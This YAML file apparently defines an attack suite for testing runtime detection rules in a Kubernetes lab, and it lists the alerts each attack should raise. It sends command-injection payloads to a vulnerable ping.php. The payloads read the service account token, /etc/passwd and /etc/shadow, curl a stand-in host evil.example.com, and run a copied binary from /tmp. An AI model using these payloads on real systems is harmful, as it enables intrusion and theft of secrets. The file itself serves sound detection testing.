apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: webapp-attacks
  description: >-
    Attack suite for the PHP webapp. Exploits command injection in ping.php
    to trigger multiple detection rules. The webapp runs PHP/Apache on Debian
    and has curl, cat, ls, whoami, wget available in the container.
target:
  service: webapp-mywebapp
  namespace: webapp
  port: 8080

attacks:
  # ─── Command Injection (R0001 + R0006) ────────────────────────────────────
  # ping.php runs `ping -c1 $ip` without sanitizing — semicolons chain commands.

  - name: cmdinject-sa-token
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    successIndicators:
      - bodyContains: "eyJ"

  - name: cmdinject-etc-passwd
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "127.0.0.1;cat /etc/passwd"
    successIndicators:
      - bodyContains: "root:"

  - name: cmdinject-whoami
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "127.0.0.1;whoami"
    successIndicators:
      - bodyContains: "www-data"

  - name: cmdinject-ls-secrets
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "127.0.0.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"
    successIndicators:
      - bodyContains: "token"

  # ─── Post-Exploit: Sensitive File Access (R0010) ───────────────────────────
  # Read files that node-agent flags as sensitive regardless of profile.

  - name: postexploit-etc-shadow
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "127.0.0.1;cat /etc/shadow || true"
    successIndicators:
      - statusCode: 200  # file open triggers R0010 even if read fails (www-data can't read shadow)

  # ─── Post-Exploit: DNS Anomaly (R0005) ─────────────────────────────────────
  # Resolve a domain not in the learned network neighborhood.

  - name: postexploit-dns-anomaly
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "127.0.0.1;curl -sm1 http://evil.example.com || true"
    successIndicators:
      - statusCode: 200

  # ─── Post-Exploit: Drifted Binary (R1001) ──────────────────────────────────
  # Download a binary into /tmp and execute it. The binary was not in the
  # original container image — node-agent detects this as a "drifted process".
  # We use a harmless binary (busybox) to avoid actual malice.

  - name: postexploit-drifted-binary
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "127.0.0.1;cp /bin/ls /tmp/drifted && /tmp/drifted /etc || true"
    successIndicators:
      - statusCode: 200

expectedDetections:
  # Command injection spawns "cat" — unexpected process
  - attackType: cmdinject
    ruleID: R0001
    ruleName: "Unexpected process launched"
    containerName: mywebapp-app
    command: cat

  # cat reads SA token file
  - attackType: cmdinject
    ruleID: R0006
    ruleName: "Unexpected Service Account Token Access"
    containerName: mywebapp-app
    command: cat

  # cat /etc/shadow triggers sensitive file rule (confirmed firing in live run)
  - attackType: cmdinject
    ruleID: R0010
    ruleName: "Unexpected Sensitive File Access"
    containerName: mywebapp-app
    command: cat

  # curl to evil.example.com triggers DNS anomaly
  # - attackType: cmdinject
  #   ruleID: R0005
  #   ruleName: "Unexpected domain request"
  #   containerName: mywebapp-app
  #   command: curl

  # /tmp/drifted is not in the original image (confirmed firing in live run)
  - attackType: cmdinject
    ruleID: R1001
    ruleName: "Drifted process executed"
    containerName: mywebapp-app
    command: drifted
